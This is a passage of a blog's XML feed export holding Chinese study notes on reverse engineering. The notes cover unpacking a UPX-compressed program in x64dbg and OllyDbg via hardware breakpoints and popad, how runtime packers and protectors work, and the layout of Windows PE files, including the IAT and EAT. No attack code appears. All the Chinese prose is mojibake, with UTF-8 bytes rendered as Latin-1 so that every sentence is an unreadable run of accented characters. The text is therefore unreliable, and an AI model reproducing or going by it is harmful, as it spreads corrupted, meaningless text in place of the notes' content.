src="https://s2.loli.net/2023/12/13/XcMx5TEzsZaekKR.png" alt="b" style="zoom:33%;" /><img src="https://s2.loli.net/2023/12/13/JVCxMTav3Pb5oqN.png" alt="c" style="zoom:33%;" /><p>å¯ä»¥çœ‹å‡º,å‹ç¼©åå‡½æ•°å˜å¾—æå°‘,å¯ä»¥ä½œä¸ºåˆ¤æ–­æ˜¯å¦æœ‰å£³çš„æ–¹æ³•.</p><p>åœ¨å¼€å§‹å¤„ç‚¹f2ä¸‹æ–­ç‚¹å¹¶è¿›è¡ŒåŠ¨æ€è°ƒè¯•:</p><img src="https://s2.loli.net/2023/12/13/oKPZxGBQt1AvWXO.png" alt="d" style="zoom:33%;" /><img src="https://s2.loli.net/2023/12/13/h4OsAL3VNDYijWb.png" alt="e" style="zoom:80%;" /><p>f8å•æ­¥è°ƒè¯•å¹¶è§‚å¯Ÿæ ˆ:</p><img src="https://s2.loli.net/2023/12/13/xmTjoiJuczEbXkH.png" alt="f" style="zoom:80%;" /><p>å¤åˆ¶æ ˆå¯¹åº”åœ°å€å¹¶gè·³è½¬ç„¶åä¸‹ç¡¬ä»¶æ–­ç‚¹:</p><img src="https://s2.loli.net/2023/12/13/fMiQDm8aeAJPIXC.png" alt="g" style="zoom:80%;" /><img src="https://s2.loli.net/2023/12/13/je9cyJPmXhFVCzp.png" alt="h" style="zoom:80%;" /><p>è§‚å¯Ÿåˆ°æ ˆå·²ç»ä¸‹äº†æ–­ç‚¹,è¿™æ—¶ç›´æ¥f9,å¼¹å‡º</p><img src="https://s2.loli.net/2023/12/13/gswat71T26xAXKQ.png" alt="i" style="zoom:50%;" /><p>è·³è½¬åˆ°</p><img src="https://s2.loli.net/2023/12/13/yS8JnoQ5D647LGu.png" alt="j" style="zoom:80%;" /><p>è½¬æ¢æ±‡ç¼–è§†å›¾å¯ä»¥å‘ç°</p><img src="https://s2.loli.net/2023/12/13/Q9LUcBgMjTPoqa5.png" alt="k" style="zoom:80%;" /><p>æŒ‡é’ˆç‚¹å‡»å¾ªç¯ä¸‹é¢çš„ä½ç½®ç‚¹f4è¿è¡Œåˆ°å¯¹åº”ä½ç½®,å†å‡ æ¬¡f8è¿›å¤§è·³è½¬å°±è¿›å…¥oepäº†,è¿™ä¸ªåœ°æ–¹æ³¨æ„è¦å…ˆæŠŠç¡¬ä»¶æ–­ç‚¹åˆ äº†,ç‚¹å‡»ä¸Šé¢å·¥å…·æ çš„æ–­ç‚¹åˆ—è¡¨delé”®åˆ æ‰</p><h3 id="å®ä¾‹2-ä½¿ç”¨OD">å®ä¾‹2(ä½¿ç”¨OD)</h3><p>è¿™æ˜¯ä¸€ä¸ªx32ç¨‹åº,ä½¿ç”¨od</p><p>è¿›å…¥åå‘ç°:</p><img src="https://s2.loli.net/2023/12/13/Q6BGY5ECRXzkfZV.png" alt="l" style="zoom:80%;" /><p>å’Œä¸Šé¢æ–¹æ³•ä¸€æ ·,å…ˆf8,ç„¶åå¯¹å¯„å­˜å™¨ä¸‹æ–­ç‚¹(å³é”®sepå€¼å¤åˆ¶,åœ¨ä¸‹é¢çš„å‘½ä»¤çª—å£è¾“å…¥hr (å¯¹åº”çš„åœ°å€))è¿™è¡¨ç¤ºæ˜¯ç¡¬ä»¶è¯»å–æ–­ç‚¹.å›è½¦</p><img src="https://s2.loli.net/2023/12/13/6UYmy4JF8NeqdDz.png" alt="m" style="zoom:80%;" /><p>ç„¶åç›´æ¥f9,åˆ æ‰ç¡¬ä»¶æ–­ç‚¹:è°ƒè¯•-ç¡¬ä»¶æ–­ç‚¹-åˆ é™¤.å°±æ‰¾åˆ°äº†pop,å°å¾ªç¯,å¤§è·³è½¬</p><img src="https://s2.loli.net/2023/12/13/ncliZFbTf6NDGtW.png" alt="n" style="zoom:80%;" /><p>ä¹‹åä¸ç¬¬ä¸€ä¸ªå†™çš„ç›¸åŒ</p><p>æˆ–è€…åœ¨å¼€å§‹çš„æ—¶å€™,ctrl+fæœç´¢popad</p><img src="https://s2.loli.net/2023/12/13/umPHGU7vtcY5wEO.png" alt="o" style="zoom:80%;" /><p>ç„¶åæ‰¾åˆ°å¯¹åº”ä½ç½®:</p><img src="https://s2.loli.net/2023/12/13/XEZIDWQcYvMSk83.png" alt="p" style="zoom:80%;" /><p>ç„¶åç›´æ¥f4å³å¯</p>]]></content>
      
      
      <categories>
          
          <category> é€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç† </category>
          
          <category> å®è·µ </category>
          
          <category> é€†å‘ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é€†å‘ </tag>
            
            <tag> å®è·µ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Šé€†æ ¸ã€‹02-è¿è¡Œæ—¶å‹ç¼©å™¨01</title>
      <link href="/posts/264d914b.html"/>
      <url>/posts/264d914b.html</url>
      
        <content type="html"><![CDATA[<h1>è¿è¡Œæ—¶å‹ç¼©å™¨</h1><p>å®šä¹‰ï¼šé’ˆå¯¹äºPEæ–‡ä»¶è€Œè¨€ï¼Œå¯æ‰§è¡Œæ–‡ä»¶å†…éƒ¨å«æœ‰è§£å‹ç¼©ä»£ç ï¼Œæ–‡ä»¶åœ¨è¿è¡Œç¬é—´äºå†…å­˜ä¸­è§£å‹åæ‰§è¡Œã€‚</p><p>è¿è¡Œæ—¶å‹ç¼©æ–‡ä»¶ä¹Ÿæ˜¯PEæ–‡ä»¶ï¼Œå«æœ‰åŸPEæ–‡ä»¶å’Œè§£ç ç¨‹åºã€‚åœ¨ç¨‹åºçš„EPä»£ç ä¸­æ‰§è¡Œè§£ç ç¨‹åºï¼Œåœ¨ç¨‹åºå…¥å£ï¼ˆEPï¼‰å¤„æ‰§è¡Œè§£ç ç¨‹åºï¼ŒåŒæ—¶åœ¨å†…å­˜ä¸­è§£å‹ç¼©åæ‰§è¡Œã€‚</p><h2 id="1åˆ†ç±»">1åˆ†ç±»</h2><p>åˆ†ä¸ºå‹ç¼©å™¨å’Œä¿æŠ¤å™¨ã€‚</p><h3 id="1-1å‹ç¼©å™¨">1.1å‹ç¼©å™¨</h3><p>ç›®çš„ï¼š</p><p>å‡å°PEæ–‡ä»¶å¤§å°ï¼Œä¾¿äºä¼ è¾“å’Œä¿å­˜</p><p>éšè—PEæ–‡ä»¶å†…éƒ¨ä»£ç å’Œèµ„æº</p><h3 id="1-2ä¿æŠ¤å™¨">1.2ä¿æŠ¤å™¨</h3><p>ç›®çš„ï¼š</p><p>ä¿æŠ¤PEæ–‡ä»¶å…å—ä»£ç é€†å‘åˆ†æï¼Œåº”ç”¨å¤šç§é˜²æ­¢ä»£ç é€†å‘çš„æŠ€æœ¯ï¼ˆåè°ƒè¯•ï¼Œåæ¨¡æ‹Ÿï¼Œä»£ç æ··æ·†ï¼Œå¤šæ€ä»£ç ï¼Œåƒåœ¾ä»£ç ï¼Œè°ƒè¯•å™¨ç›‘è§†ç­‰ï¼‰ã€‚å‹ç¼©åæ¯”æºæ–‡ä»¶å¤§</p><p>é˜²ç ´è§£ï¼Œä¿æŠ¤ä»£ç ä¸èµ„æº</p><h2 id="2UPX">2UPX</h2><p>ä¸€ç§å‹ç¼©å™¨ï¼Œæ¯”è¾ƒä¸»æµ</p><h3 id="2-1å‹ç¼©åç‰¹ç‚¹">2.1å‹ç¼©åç‰¹ç‚¹</h3><ul><li>PEå¤´å’ŒåŸæ¥ç›¸åŒ</li><li>èŠ‚åŒºåç§°æ”¹å˜(.textå˜ä¸ºUPX0,.dataå˜ä¸ºUPX1)</li><li>ç¬¬ä¸€ä¸ªèŠ‚åŒºçš„RawDataSize=0(ç©ºèŠ‚åŒº)</li><li>EPåœ¨ç¬¬äºŒä¸ªèŠ‚åŒº</li><li>èµ„æºèŠ‚åŒºå¤§å°<code>å‡ ä¹</code>æ— å˜åŒ–</li><li>å…¥å£ç‚¹æ”¹å˜</li></ul><h3 id="2-2è¡¥å……">2.2è¡¥å……</h3><blockquote><p>ä¸ºä»€ä¹ˆç¬¬ä¸€ä¸ªèŠ‚åŒºæ˜¯ç©ºèŠ‚åŒº</p><p>èŠ‚åŒºå¤´ä¸­,ç¬¬ä¸€ä¸ªèŠ‚åŒº(UPX0)çš„RawDataSizeä¸º0,ä½†æ˜¯VirtualSizeä¸º10000.ä»£ç å’Œæ•°æ®éƒ½åœ¨UPX1ä¸­.UPXè§£å‹å,PEæ–‡ä»¶è¿è¡Œç¬é—´å°†è§£å‹çš„ä»£ç è§£å‹åˆ°ç¬¬ä¸€ä¸ªèŠ‚åŒº,è§£å‹ç»“æŸå,è¿è¡Œæºæ–‡ä»¶çš„EPä»£ç .</p></blockquote><blockquote><p>å…¥å£ç‚¹çš„å˜åŒ–</p><p>ä¿®æ”¹åï¼Œç¨‹åºå…¥å£ç‚¹EPåˆ°äº†UPX1çš„æœ«ç«¯ï¼Œè€ŒçœŸå®å…¥å£ç‚¹OEPåœ¨EPä¹‹å‰ã€‚å‹ç¼©åEPå¤„æŒ‡ä»¤ä¸ºPUSHAD(å’ŒPUSHAç›¸åŒ)ï¼Œæ˜¯å°†EAX~EDIçš„å€¼ä¿å­˜åˆ°æ ˆï¼Œç„¶åä¸ºMOV ESI,xï¼Œxæ˜¯UPX0çš„èµ·å§‹åœ°å€</p></blockquote><h3 id="2-3UPXé¢å¤–æ‰§è¡Œçš„æ“ä½œ">2.3UPXé¢å¤–æ‰§è¡Œçš„æ“ä½œ</h3><ol><li>PUSHAD(å’ŒPUSHAç›¸åŒ)ï¼Œå°†EAX~EDIçš„å€¼å‹å…¥æ ˆ</li><li>mov esi,x(æˆ–offset x),å°†x(ä¸€ä¸ªåœ°å€,å¦‚æœæ˜¯offsetåˆ™æ˜¯xçš„åœ°å€)è£…å…¥esiå¯„å­˜å™¨ä¸­,è¿™æ˜¯æŠŠUPX1çš„  èµ·å§‹åœ°å€æ”¾åˆ°ESIä¸­</li><li>LEA EDI,DWORD PTR DS:[ESI+y]æˆ–lea edi, [esi-y]è¿™ä¸ªçš„ä½œç”¨æ˜¯æŠŠUPX0çš„èµ·å§‹åœ°å€æ”¾åˆ°EDIä¸­</li><li>PUSH EDIæ˜¯æŠŠé¦–åœ°å€å…¥æ ˆ</li><li>è§£å¯†å¾ªç¯:(ä»EDXä¸­è¯»å–ä¸€ä¸ªå­—èŠ‚å†™å…¥EDI??å­˜ç–‘)å…·ä½“çš„è§£å¯†ç®—æ³•æŒ‰ç…§åŠ å¯†æ¥é€‰æ‹©</li><li>è§£å‹ç¼©å¾ªç¯:ä»ESIæ‰€æŒ‡çš„UPX1ä¸­ä¾æ¬¡è¯»å€¼,ç»è¿‡LZMAè§£å‹ç¼©å¡«å……åˆ°ä¹‹å‰ä¸ºNULLçš„EDIæ‰€æŒ‡çš„UPX0ä¸­</li><li>é‡å®šä½å¾ªç¯:æŠŠæ‰€æœ‰<code>åŸºäºåœ°å€çš„ä½ç½®æ— å…³ä»£ç </code>(PIC)<a href="8430b536.html">é‡å®šä½</a>,PICæ˜¯åªä½¿ç”¨ç›¸å¯¹ä½ç½®çš„æŒ‡ä»¤.å¦‚(CALL,JMPç­‰),PICåœ¨.dataå¼€å¤´åˆ›å»ºäº†å…¨å±€åç§»è¡¨(GOT)</li></ol><p>ç„¶åä¼šè¿›è¡ŒIATçš„å»ºç«‹ã€‚æœ€åå†å¼€å§‹æ‰§è¡Œæºä»£ç ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> é€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç† </category>
          
          <category> çŸ¥è¯†é›† </category>
          
          <category> é€†å‘ </category>
          
          <category> æŠ€èƒ½ </category>
          
          <category> åé™æ€åˆ†æ </category>
          
          <category> å‹ç¼©å™¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é€†å‘ </tag>
            
            <tag> å­¦ä¹  </tag>
            
            <tag> å‹ç¼©å™¨ </tag>
            
            <tag> å£³ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Šé€†æ ¸ã€‹01-PEæ–‡ä»¶ç»“æ„</title>
      <link href="/posts/923a3c19.html"/>
      <url>/posts/923a3c19.html</url>
      
        <content type="html"><![CDATA[<h1>PEæ–‡ä»¶æ ¼å¼</h1><p>PEæ–‡ä»¶æ ¼å¼æ˜¯Windowsæ“ä½œç³»ç»Ÿä¸­çš„æ ¸å¿ƒå†…å®¹ï¼Œå­¦ä¹ PEæ–‡ä»¶æ ¼å¼å¯ä»¥ç†è§£å¯æ‰§è¡Œæ–‡ä»¶å¦‚ä½•å‚¨å­˜ï¼Œå¦‚ä½•è¿›å…¥å†…å­˜è¢«æ‰§è¡Œã€‚</p><h3 id="PEæ–‡ä»¶å®šä¹‰">PEæ–‡ä»¶å®šä¹‰</h3><p>PEæ–‡ä»¶æ˜¯windowsæ“ä½œç³»ç»Ÿä¸‹çš„å¯æ‰§è¡Œæ–‡ä»¶</p><p>å…¶ä¸­32ä½çš„å¯æ‰§è¡Œæ–‡ä»¶ç§°ä¸ºPEæˆ–PE32ï¼Œ64ä½çš„è¢«ç§°ä¸ºPE32+æˆ–PE+ã€‚</p><p>PEæ–‡ä»¶åˆ†ä¸º4ç§ç±»å‹ï¼š</p><blockquote><p>å¯æ‰§è¡Œç³»åˆ—ï¼š.EXE  .SCR</p><p>åº“ç³»åˆ—ï¼š.DLL  .OCX  .CPL  .DRV</p><p>é©±åŠ¨ç¨‹åºç³»åˆ—ï¼š.SYS  .VXD</p><p>å¯¹è±¡æ–‡ä»¶ç³»åˆ—ï¼š.OBJï¼ˆé™¤äº†è¯¥é¡¹å¤–ï¼Œä¸Šé¢ä¸‰ç§éƒ½å¯æ‰§è¡Œï¼Œ</p><p>â€‹      PEæ­£å¼è§„èŒƒä¸­OBJæ–‡ä»¶ä¹Ÿæ˜¯PEæ–‡ä»¶ï¼‰</p></blockquote><h3 id="PEæ–‡ä»¶ç»“æ„">PEæ–‡ä»¶ç»“æ„</h3><p>PEæ–‡ä»¶åˆ†ä¸º<strong>PEå¤´</strong>å’Œ<strong>PEä½“</strong>ï¼Œåˆå¯ç»†åˆ†ä¸ºDOSå¤´ï¼ŒDOSå­˜æ ¹ï¼ŒNTå¤´ï¼ŒèŠ‚åŒºå¤´ï¼ˆåˆ†åˆ«ä¸º.text,.dataå’Œ.rsrc)ç„¶åæ˜¯èŠ‚åŒºï¼ˆåˆ†åˆ«ä¸º.textï¼Œ.dataå’Œ.rsrcèŠ‚åŒºï¼‰ã€‚textä¸ºä»£ç åŒºï¼Œdataä¸ºæ•°æ®åŒºå­˜æ”¾æ•°æ®ç»“æ„ï¼Œrsrcä¸ºèµ„æºåŒºï¼Œwindowsç‰¹æœ‰ï¼Œå­˜æ”¾åº”ç”¨ç¨‹åºèµ„æºã€‚</p><p>æ¯ä¸ªèŠ‚åŒºå‰åå­˜åœ¨<strong>NULLå¡«å……</strong>ï¼Œå³ç”¨00å¡«å……åœ¨èŠ‚åŒºå¤´ä¸èŠ‚åŒºï¼ŒèŠ‚åŒºä¸èŠ‚åŒºä¹‹é—´ï¼Œä»¤æ–‡ä»¶æˆ–å†…å­˜ä¸­èŠ‚åŒºçš„èµ·å§‹ä½ç½®åœ¨å„æ–‡ä»¶/å†…å­˜æœ€å°å•ä½çš„å€æ•°ä¸Šï¼ˆè¿™ä¸ªå€¼ä¸NTå¤´ä¸­çš„æˆå‘˜æœ‰å…³ï¼‰ã€‚</p><p>PEå¤´ï¼šPEå¤´çš„æ„æˆæ˜¯è®¸å¤šç»“æ„ä½“ï¼ˆDOSå¤´ï¼ŒDOSå­˜æ ¹ï¼ŒNTå¤´ï¼ŒèŠ‚åŒºå¤´ï¼‰ã€‚ä»¥ä¸‹ä»‹ç»ç»“æ„ä½“ä¸­çš„éƒ¨åˆ†é‡è¦æˆå‘˜</p><hr><h4 id="1ï¼‰DOSå¤´">1ï¼‰<strong>DOSå¤´</strong></h4><ul><li>ï¼ˆIMAGE_DOS_HEADER)(19ä¸ªæˆå‘˜)ï¼š</li><li>e_magic:dosç­¾åï¼š4D5A-&gt;MZ</li><li>e_lfanew(long):æŒ‡å‘NTå¤´çš„åç§»ï¼ˆæ³¨æ„ï¼Œè¿™æ˜¯longå€¼ï¼Œä½†æ˜¯æ•°æ®è¡¨æ˜äº†ä»æ–‡ä»¶å¼€å¤´åˆ°NTå¤´çš„åç§»å€¼ï¼Œå¯ä»¥è¢«ç”¨ä½œæŒ‡é’ˆ.åŒæ—¶è¯¥å€¼ä¹Ÿæ˜¯å°ç«¯åºå‚¨å­˜ï¼‰</li></ul><hr><h4 id="2-DOSå­˜æ ¹ï¼š">2)<strong>DOSå­˜æ ¹</strong>ï¼š</h4><p>â€‹doså­˜æ ¹ä¸æ˜¯ç»“æ„ä½“ï¼Œæ˜¯å­˜åœ¨äºDOSå¤´ä¸‹æ–¹çš„ä¸€æ®µå‘½ä»¤ä¸æ•°æ®çš„æ··åˆï¼Œå¦‚æœåœ¨dosç¯å¢ƒä¸‹è¿è¡Œç¨‹åºï¼Œä¼šæ‰§è¡Œè¿™é‡Œçš„æŒ‡ä»¤ã€‚</p><hr><h4 id="3ï¼‰NTå¤´">3ï¼‰<strong>NTå¤´</strong></h4><ul><li><p>ï¼ˆIMAGE_NT_HEADERS)(ä¸‰ä¸ªæˆå‘˜)ï¼š</p></li><li><p>Signature(dword):ç­¾åï¼š50450000h-&gt;&quot;PE&quot;00</p></li><li><p><code>FileHeader</code>(IMAGE_FILE_HEADER):æ–‡ä»¶å¤´ï¼Œæ˜¯ä¸€ä¸ªç»“æ„ä½“</p><ul><li><p>Machine:æ¯ç§ç±»å‹çš„å€¼è¡¨æ˜èƒ½åœ¨å“ªç§cpuä¸Šç¼–è¯‘è¿è¡Œï¼š14ch=x86,8664h=x64ç­‰ç­‰ï¼Œä½†æ˜¯å¹¶ä¸æ˜¯è¯´32ä½çš„åªèƒ½åœ¨32ä½ç³»ç»Ÿä¸Šè¿è¡Œï¼Œç°åœ¨æœ‰å¾ˆå¤šæ–¹æ³•å¯ä»¥å…¼å®¹è¿è¡Œã€‚</p></li><li><p>NumberOfSelection:èŠ‚åŒºæ•°é‡ï¼Œä¸€å®šå¤§äº0</p></li><li><p>SizeOfOpionalHeader:æŒ‡å‡ºNTå¤´ä¸­æœ€åä¸€ä¸ªæˆå‘˜                               ï¼ˆIMAGE_OPTIONAL_HEADER32æˆ–64ï¼‰çš„å¤§å°ä¾›ç³»ç»ŸæŸ¥çœ‹</p></li><li><p>Characteristicsï¼ˆword):æ ‡è¯†æ–‡ä»¶å±æ€§,æ¯ä¸€ä½éƒ½ä»£è¡¨ä¸€ä¸ªå±æ€§ï¼Œå¦‚0x0002è¡¨ç¤ºè¿™æ˜¯å¯æ‰§è¡Œæ–‡ä»¶,0x1000è¡¨ç¤ºæ˜¯ç³»ç»Ÿæ–‡ä»¶,0x2000è¡¨ç¤ºè¿™æ˜¯dllæ–‡ä»¶</p></li><li><p>TimeDateStamp:æ ‡è¯†ç¼–è¯‘æ—¶é—´</p></li></ul></li><li><p><code>OptionalHeader</code>(IMAGE_OPTIONAL_HEADER32OR64):å¯é€‰å¤´ï¼š</p><ul><li><p>Magic:å¯é€‰å¤´ä¸º32ä½æ—¶ä¸º10B,64ä½æ—¶ä¸º20B</p></li><li><p><em>AddressOfEnterPoint</em>:EPçš„rvaå€¼ï¼ŒæŒ‡å‡ºèµ·å§‹ä»£ç åœ°å€</p></li><li><p>ImageBase:æŒ‡å‡ºä¼˜å…ˆè£…å…¥åœ°å€0~FFFFFFFï¼Œç”±äºåŸä½ç½®å¯èƒ½å·²ç»åŠ è½½äº†å…¶å®ƒPEæ–‡ä»¶(ä¸»è¦æ˜¯dll)</p></li><li><p>SectionAlignment,FileAlignment:æŒ‡å®šèŠ‚åŒºåœ¨ç£ç›˜ä½ç½®å’Œå†…å­˜å‚¨å­˜çš„æœ€å°å•ä½</p></li><li><p>SizeOfImage:æŒ‡å®šimageåœ¨è™šæ‹Ÿå†…å­˜ä¸­å çš„å¤§å°</p></li><li><p>SizeOfHeader:æŒ‡å‡ºPEå¤´çš„å¤§å°ï¼Œåº”æ˜¯SectionAlignmentçš„æ•´æ•°å€</p></li><li><p>Subsystem:è¯¥å€¼è¡¨ç¤ºæ–‡ä»¶ç±»å‹ï¼š1:é©±åŠ¨æ–‡ä»¶ï¼Œ2:çª—å£åº”ç”¨ç¨‹åºï¼Œ3ï¼šæ§åˆ¶å°åº”ç”¨ç¨‹åº</p></li><li><p>NumberOfRvaAndSizes:è¯¥å€¼æŒ‡å®šä¸‹ä¸€ä¸ªå…ƒç´ (DataDirectory)çš„å…ƒç´ ä¸ªæ•°,æ ‡å‡†æ˜¯16ä¸ª(10h)</p></li><li><p>DataDirectory(ç»“æ„ä½“æ•°ç»„):é‡ç‚¹æ˜¯0å’Œ1å’Œ9ï¼Œè¯¥é¡¹å­˜äº†è®¸å¤šè¡¨</p></li></ul></li></ul><hr><h4 id="4ï¼‰èŠ‚åŒºå¤´">4ï¼‰<code>èŠ‚åŒºå¤´</code></h4><p>(èŠ‚åŒºå¤´æ˜¯ç”±ç»“æ„ä½“ç»„æˆçš„æ•°ç»„ï¼Œæ¯ä¸ªç»“æ„ä½“å¯¹åº”äº†ä¸€ä¸ªèŠ‚åŒº)ï¼š</p><ul><li><p>IMAGE_SECTION_HEADERæ˜¯ç»“æ„ä½“çš„ç±»å‹ï¼Œå…¶ä¸­æœ‰éƒ¨åˆ†é‡è¦æˆå‘˜ï¼š</p><ul><li><p>VirtualAdressï¼ˆæ— å€¼ï¼Œå·²è¢«å¯é€‰å¤´å†…å®¹å®šä¹‰ï¼‰</p></li><li><p><s>VirtulSize:å†…å­˜ä¸­èŠ‚åŒºå¤§å°ï¼ˆæ— å€¼ï¼Œå·²è¢«å¯é€‰å¤´å†…å®¹å®šä¹‰ï¼‰</s></p></li><li><p>VirtulSize:è¡¨æ˜å†…å­˜ä¸­èŠ‚åŒºçš„å¤§å°</p></li><li><p>SizeOfRawData:ç£ç›˜æ–‡ä»¶ä¸­èŠ‚åŒºå¤§å°</p><ul><li>VirtualSizeä¸SizeOfRawDataä¸€èˆ¬ä¸åŒï¼Œè¯´æ˜<strong>ç£ç›˜æ–‡ä»¶ä¸­èŠ‚åŒºå¤§å°ä¸åŠ è½½åˆ°å†…å­˜åçš„èŠ‚åŒºå¤§å°ä¸åŒ</strong>,è‹¥VirtualSizeå¤§äºSizeOfRawData,èŠ‚åŒºå‰©ä½™éƒ¨åˆ†ä¼šè¢«å¡«å……ä¸º0</li></ul></li><li><p>PointerToRawData:ç£ç›˜æ–‡ä»¶ä¸­èŠ‚åŒºèµ·å§‹ä½ç½®ï¼ˆå¿…é¡»ä¸ºFileAlignmentçš„æ•´å€æ•°ï¼‰</p></li><li><p>Characteristics:å±æ€§ï¼Œç”±ä½æˆ–è€Œæ¥</p></li><li><p>Name:å¯ä»¥å¡«å…¥ä»»ä½•å€¼ï¼Œæ‰€ä»¥ä»…ä¾›å‚è€ƒä¸ä¸€å®šå«.codeçš„åŒºæ˜¯.codeåŒº</p></li></ul></li></ul><hr><h3 id="PEæ–‡ä»¶çš„æ˜ å°„">PEæ–‡ä»¶çš„æ˜ å°„</h3><p><code>RVA(ç›¸å¯¹è™šæ‹Ÿåœ°å€) to RAW(æ–‡ä»¶åç§»)</code></p><p><code>RAW=RVA-VA+PointerToRawData</code></p><p>å³ï¼š</p><p>é¦–å…ˆæ‰¾åˆ°èŠ‚åœ¨å†…å­˜ä¸­çš„åç§»ï¼Œç„¶åæ‰¾åˆ°RVAæ€»åç§»ï¼Œå–å¾—ç›¸å¯¹åç§»ååŠ PointerToRawDataï¼ˆèŠ‚çš„æ–‡ä»¶åç§»ï¼‰å¾—åˆ°æ€»æ–‡ä»¶åç§»</p><h3 id="IATå’ŒEAT">IATå’ŒEAT</h3><h4 id="IAT">IAT:</h4><p>å¯¼å…¥åœ°å€è¡¨</p><p>IMAGE_IMPORT_DESCRIPTOR(åˆå«IMPORT Directory Table):</p><img src="https://s2.loli.net/2023/12/12/YAfSmIR19C5wlrN.png" alt="IMAGE_IMPORT_DESCRIPTOR" /><p>ä¸€ä¸ªåº“å°±å¯¹åº”äº†ä¸€ä¸ªIMAGE_IMPORT_DESCRIPTORç»“æ„ä½“ï¼Œæ‰€æœ‰éœ€è¦å¯¼å…¥çš„åº“çš„æ‰€æœ‰ç»“æ„ä½“å½¢æˆäº†æ•°ç»„ï¼Œæœ€åä»¥NULLç»“æ„ä½“ç»“æŸã€‚</p><p>å…¶ä¸­çš„é‡è¦æˆå‘˜æ˜¯ï¼š</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">OriginalFirstThunk:</span>å¯¼å…¥åç§°è¡¨(è¯¥è¡¨æ˜¯æŒ‡å‘å‡½æ•°åçš„æŒ‡é’ˆæ•°ç»„ï¼‰INT  åœ°å€rva(æ³¨æ„è¯¥å€¼å’Œcharacteristicsæ˜¯ä¸€ä¸ªè”åˆ)</span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">Name:</span>åº“åç§°å­—ç¬¦ä¸²åœ°å€rva</span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">FirsThunk:</span>å¯¼å…¥åœ°å€è¡¨(è¯¥è¡¨æ˜¯æŒ‡å‘å‡½æ•°åœ°å€çš„æŒ‡é’ˆæ•°ç»„)IATåœ°å€rva</span><br></pre></td></tr></table></figure><p>ä½œç”¨æ–¹å¼ï¼š</p><p>ç¼–è¯‘æ—¶ï¼ŒINTè¢«åˆ›å»ºï¼Œæ¯ä¸ªåº“éƒ½æŠŠæŒ‡å‘ä¸åŒå‡½æ•°åçš„æŒ‡é’ˆ(æŒ‡å‘å­—ç¬¦ä¸²)å†™å…¥INTè¡¨å’ŒIATè¡¨ï¼Œè¿è¡Œæ—¶ï¼Œç¨‹åºå…ˆæŸ¥æ‰¾ç»‘å®šè¾“å…¥è¡¨ï¼Œç„¶åæ ¹æ®ä¿¡æ¯åœ¨INTåœ°å€æ‰¾åˆ°å‡½æ•°åï¼ŒæŠŠå‡½æ•°åœ°å€å†™å…¥IATï¼Œä¾›åç»­ä½¿ç”¨ã€‚</p><p>æ­¤ç»“æ„ä½“æ•°ç»„è¢«å‚¨å­˜åœ¨PEä½“ä¸­ï¼Œä½†PEå¤´ä¸­IMAGE_OPTIONAL_HEADER32OR64.DataDirectory[1].VirtualAddressæ˜¯è¯¥ç»“æ„ä½“æ•°ç»„çš„èµ·å§‹ä½ç½®ï¼ˆRVAï¼‰ï¼ˆå‰4å­—èŠ‚ï¼‰ï¼Œå4å­—èŠ‚æ˜¯å¤§å°ã€‚</p><h4 id="EAT">EAT:</h4><p>å¯¼å‡ºåœ°å€è¡¨</p><p>IMAGE_EXPORT_DIRECTORY:</p><img src="https://s2.loli.net/2023/12/12/9y6bau1iTYPIhfH.png" alt="IMAGE_EXPORT_DIRECTORY" /><p>åŒä¸Šï¼Œæ¯ä¸ªæ¨¡å—(dll)éƒ½æœ‰ä¸€ä¸ªç»“æ„ä½“ï¼Œä¸€èµ·æ„æˆæ•°ç»„ï¼Œé‡è¦æˆå‘˜æœ‰ï¼š</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">NumberOfFuctions:</span>å®é™…å¯¼å‡ºå‡½æ•°ä¸ªæ•°</span><br><span class="line"></span><br><span class="line"><span class="symbol">NumberOfNames:</span>å¯¼å‡ºå‡½æ•°ä¸­å…·åçš„å‡½æ•°ä¸ªæ•°(æ˜¾å¼å‘½å)</span><br><span class="line"></span><br><span class="line"><span class="symbol">AddressOfFunctions:</span>å¯¼å‡ºå‡½æ•°åœ°å€æ•°ç»„ï¼Œå«æœ‰å…¥å£åœ°å€ï¼Œä¸ªæ•°ä¸ºNumberOfFunctions</span><br><span class="line"></span><br><span class="line"><span class="symbol">AddressOfNames:</span>å‡½æ•°åç§°åœ°å€æ•°ç»„ï¼Œæœ‰æŒ‡å‘å…¨éƒ¨å¯¼å‡ºå‡½æ•°å…¥å£åœ°å€çš„rvaï¼Œä¸ªæ•°ä¸ºNumberOfNames</span><br><span class="line"></span><br><span class="line"><span class="symbol">AddressOfNameOrdinals:</span>å­˜è¯¥dllä¸­çš„å‡½æ•°çš„åºå·ï¼ˆordinalï¼‰</span><br><span class="line"></span><br><span class="line"><span class="symbol">Name:</span>æ˜¯æŒ‡å‘æ¨¡å—ï¼ˆdllï¼‰åœ¨å†…å­˜ä¸­çš„ç›¸åŒåç§°åœ°å€çš„æŒ‡é’ˆï¼Œåœ°å€ä¸ºRVA</span><br><span class="line"></span><br><span class="line"><span 